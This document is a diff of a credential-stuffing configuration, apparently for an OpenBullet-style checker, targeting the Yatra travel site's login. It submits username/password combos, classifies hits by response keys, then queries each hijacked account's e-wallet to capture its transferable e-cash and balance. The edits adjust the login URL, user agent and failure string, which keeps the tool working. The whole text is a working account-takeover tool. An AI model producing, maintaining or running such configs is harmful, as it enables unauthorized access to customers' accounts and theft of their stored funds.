@@ -25,10 +25,10 @@
 }
 
 [SCRIPT]
-#ALPHA REQUEST POST "https://secure.yatra.com/social/common/yatra/login" 
+#ALPHA REQUEST POST "https://secure.yatra.com/social/common/yatra/loginpage" 
   CONTENT "emailId=<USER>&password=<PASS>" 
   CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
-  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "User-Agent:Chrome (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
   HEADER "Pragma: no-cache" 
   HEADER "Accept: */*" 
   HEADER "Origin: https://secure.yatra.com" 
@@ -39,7 +39,7 @@
     KEY "success" 
     KEY "{\"status\":\"success\"" 
   KEYCHAIN Failure OR 
-    KEY "Username or Password is invalid." 
+    KEY "Your Value is Invalid" 
     KEY "\"status\":\"failure\"}" 
 #ALPHA REQUEST GET "https://secure.yatra.com/mybookingsService/user/eWallet/getTransferableECash" 
   
@@ -49,3 +49,5 @@
   HEADER "Referer: https://secure.yatra.com/manage-bookings/allbookings" 
 #ALPHA PARSE "<SOURCE>" LR "\"transferableECash\":" "}" -> CAP "FUCK TRANSFER MONEY" 
 #ALPHA PARSE "<SOURCE>" LR "\"currentECash\":" "," -> CAP "BALANCE" 
+
+You need Update Page and all
